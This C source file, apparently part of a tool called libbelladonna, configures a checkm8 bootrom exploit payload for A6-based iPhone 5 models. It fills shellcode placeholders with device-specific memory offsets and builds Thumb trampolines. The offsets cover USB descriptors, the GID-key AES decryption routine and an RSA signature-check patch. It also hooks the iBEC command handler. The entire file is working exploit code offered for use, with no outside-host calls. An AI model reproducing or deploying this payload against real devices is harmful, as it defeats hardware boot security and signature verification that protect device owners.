#include <libbelladonna.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <payload_gen.h>
#include <checkm8_payload.h>

#define bswap32 __builtin_bswap32

#define IMG3_MAGIC 0x496D6733
#define TAG_KBAG 0x4b424147
#define TAG_DATA 0x44415441
#define AES_TYPE_GID 0x20000200
#define AES_MODE_256 0x20000000

#define PATCH_RSA_ARMv7 0x60182000

#define PAYLOAD_OFFSET_ARMV7 384
#define PAYLOAD_SIZE_ARMV7 320
#define TRAMPOLINE_SIZE_ARMV7 sizeof(uint64_t)

static char* thumb_trampoline(uint32_t src, uint32_t dest) {
	char* trampoline = malloc(TRAMPOLINE_SIZE_ARMV7);
	if(src % 2 != 1 || dest % 2 != 1) {
		free(trampoline);
		return NULL;
	}
	if(src % 4 == 1) {
		*(uint32_t*) trampoline = 0xF000F8DF;
		*(uint32_t*) (trampoline + sizeof(uint32_t)) = dest;
	}
	else {
		*(uint32_t*) trampoline = 0xF002F8DF;
		*(uint32_t*) (trampoline + sizeof(uint32_t)) = dest;
	}
	return trampoline;
}

static int add_payload_offsets(unsigned char* payload, size_t payload_len, uint32_t* offsets, size_t num_offsets) {
	for(size_t i = 0; i < num_offsets; i++) {
		uint32_t value = 0xBAD00001 + i;
		char* ptr = memmem(payload, payload_len, &value, sizeof(uint32_t));
		if(!ptr) {
			return -1;
		}
		*(uint32_t*) ptr = offsets[i];
	}
	return 0;
}

static int add_trampoline(unsigned char* payload, size_t payload_len, char* trampoline, size_t trampoline_len) {
	uint32_t value = 0xFEEDFACE;
	char* ptr = memmem(payload, payload_len, &value, sizeof(uint32_t));
	if(!ptr) {
		return -1;
	}
	memcpy(ptr, trampoline, trampoline_len);
	return 0;
}

int get_payload_configuration(uint16_t cpid, const char* identifier, checkm8_config_t* config) {
	int ret;
	config->payload = malloc(checkm8_payload_length);
	config->payload_len = checkm8_payload_length;
	memcpy(config->payload, checkm8_payload, checkm8_payload_length);

	uint32_t* shellcode_constants;
	size_t shellcode_constants_len;
	uint32_t* usb_constants;
	size_t usb_constants_len;
	uint32_t* ibec_trampoline_constants;
	size_t ibec_trampoline_constants_len;
	char* trampoline;
	size_t trampoline_len;
	switch(cpid) {
		case 0x8950:
			shellcode_constants = (uint32_t[8]){
				0x10061988, // 1 - gUSBDescriptors
				0x10061F80, // 2 - gUSBSerialNumber
				  0x7C54+1, // 3 - usb_create_string_descriptor
				0x100600D8, // 4 - gUSBSRNMStringDescriptor
				0x10079800, // 5 - PAYLOAD_DEST
	  PAYLOAD_OFFSET_ARMV7, // 6 - PAYLOAD_OFFSET
		PAYLOAD_SIZE_ARMV7, // 7 - PAYLOAD_SIZE
				0x10061A24, // 8 - PAYLOAD_PTR
			};
			if(!strcmp(identifier, "iPhone5,1") || !strcmp(identifier, "iPhone5,2")) {
				shellcode_constants_len = 8;
				usb_constants = (uint32_t[0xE]){
					0x10000000, // 1 - LOAD_ADDRESS       
				    IMG3_MAGIC, // 2 - IMG_MAGIC
					  TAG_DATA, // 3 - TAG_DATA
					  TAG_KBAG, // 4 - TAG_KBAG
				  AES_TYPE_GID, // 5 - AES_TYPE_GID
				      0x7300+1, // 6 - AES_CRYPTO_CMD
		   	      AES_MODE_256, // 7 - AES_MODE_256
		   	        0x1000691c, // 8 - RSA_OFFSET
			   PATCH_RSA_ARMv7, // 9 - PATCH_RSA			
		       		0x100009c8, // A - TRAMPOLINE_BW_OFFSET 
		       		0xFC6AF7FF, // B - TRAMPOLINE_BW
		            0x100002A0, // C - TRAMPOLINE_START  	
					  0x6E84+1, // D - GET_BOOT_TRAMPOLINE
					  0x5F80+1, // E - JUMPTO   
				};
				usb_constants_len = 0xE;
				ibec_trampoline_constants = (uint32_t[2]){
					0x00042998, // 1 - IBEC_CMD_HANDLER
				  0x10008f90+1, // 2 - JUMPTO
				};
				ibec_trampoline_constants_len = 2 * sizeof(uint32_t);
			}
			else if(!strcmp(identifier, "iPhone5,3") || !strcmp(identifier, "iPhone5,4")) {
				shellcode_constants_len = 8;
				usb_constants = (uint32_t[0xE]){
					0x10000000, // 1 - LOAD_ADDRESS       
				    IMG3_MAGIC, // 2 - IMG_MAGIC
					  TAG_DATA, // 3 - TAG_DATA
					  TAG_KBAG, // 4 - TAG_KBAG
				  AES_TYPE_GID, // 5 - AES_TYPE_GID
				      0x7300+1, // 6 - AES_CRYPTO_CMD
		   	      AES_MODE_256, // 7 - AES_MODE_256
		   	        0x10006aec, // 8 - RSA_OFFSET
			   PATCH_RSA_ARMv7, // 9 - PATCH_RSA			
		       		0x100009c8, // A - TRAMPOLINE_BW_OFFSET 
		       		0xFC6AF7FF, // B - TRAMPOLINE_BW
		            0x100002A0, // C - TRAMPOLINE_START  	
					  0x6E84+1, // D - GET_BOOT_TRAMPOLINE
					  0x5F80+1, // E - JUMPTO   
				};
				usb_constants_len = 0xE;
				ibec_trampoline_constants = (uint32_t[2]){
					0x000433F8, // 1 - IBEC_CMD_HANDLER
				  0x10009160+1, // 2 - JUMPTO
				};
				ibec_trampoline_constants_len = 2 * sizeof(uint32_t);
			}
			else {
				BELLADONNA_ERROR("No payload offsets are available for your device.");
				return -1;
			}

			trampoline = thumb_trampoline(0x10079800+1, 0x8160+1);
			if(!trampoline) {
				BELLADONNA_ERROR("Failed to build payload trampoline.");
				return -1;
			}
			trampoline_len = TRAMPOLINE_SIZE_ARMV7;
			break;
		case 0x8955:
			shellcode_constants = (uint32_t[8]){
				0x10061988, // 1 - gUSBDescriptors
				0x10061F80, // 2 - gUSBSerialNumber
				  0x7C94+1, // 3 - usb_create_string_descriptor
				0x100600D8, // 4 - gUSBSRNMStringDescriptor
				0x10079800, // 5 - PAYLOAD_DEST
	  PAYLOAD_OFFSET_ARMV7, // 6 - PAYLOAD_OFFSET
		PAYLOAD_SIZE_ARMV7, // 7 - PAYLOAD_SIZE
				0x10061A24, // 8 - PAYLOAD_PTR
			};
			shellcode_constants_len = 8;
			usb_constants = (uint32_t[0xE]){
				0x10000000, // 1 - LOAD_ADDRESS       
			    IMG3_MAGIC, // 2 - IMG_MAGIC
				  TAG_DATA, // 3 - TAG_DATA
				  TAG_KBAG, // 4 - TAG_KBAG
			  AES_TYPE_GID, // 5 - AES_TYPE_GID
			      0x7340+1, // 6 - AES_CRYPTO_CMD
		   	  AES_MODE_256, // 7 - AES_MODE_256
		   	    0x10006cd8, // 8 - RSA_OFFSET
		   PATCH_RSA_ARMv7, // 9 - PATCH_RSA			
		       	0x100009c8, // A - TRAMPOLINE_BW_OFFSET 
		       	0xFC6AF7FF, // B - TRAMPOLINE_BW
		        0x100002A0, // C - TRAMPOLINE_START  	 	
				  0x6EC4+1, // D - GET_BOOT_TRAMPOLINE
				  0x5FC0+1, // E - JUMPTO   
			};
			usb_constants_len = 0xE;
			ibec_trampoline_constants = (uint32_t[2]){
				0x00044920, // 1 - IBEC_CMD_HANDLER
			  0x10009398+1, // 2 - JUMPTO
			};
			ibec_trampoline_constants_len = 2 * sizeof(uint32_t);

			trampoline = thumb_trampoline(0x10079800+1, 0x81A0+1);
			if(!trampoline) {
				BELLADONNA_ERROR("Failed to build payload trampoline.");
				return -1;
			}
			trampoline_len = TRAMPOLINE_SIZE_ARMV7;
			break;
		default:
			BELLADONNA_ERROR("No payload offsets are available for your device.");
			return -1;
	}


	ret = add_payload_offsets(config->payload, config->payload_len, shellcode_constants, shellcode_constants_len);
	if(ret != 0) {
		BELLADONNA_ERROR("Failed to add offsets to payload.");
		return -1;
	}
	ret = add_payload_offsets(config->payload, config->payload_len, usb_constants, usb_constants_len);
	if(ret != 0) {
		BELLADONNA_ERROR("Failed to add offsets to payload.");
		return -1;
	}
	ret = add_trampoline(config->payload, config->payload_len, trampoline, trampoline_len);
	if(ret != 0) {
		BELLADONNA_ERROR("Failed to add trampoline to payload.");
		return -1;
	}
	ret = add_trampoline(config->payload, config->payload_len, (char*)ibec_trampoline_constants, ibec_trampoline_constants_len);
	if(ret != 0) {
		BELLADONNA_ERROR("Failed to add iBEC trampoline to payload.");
		return -1;
	}
	return 0;
}
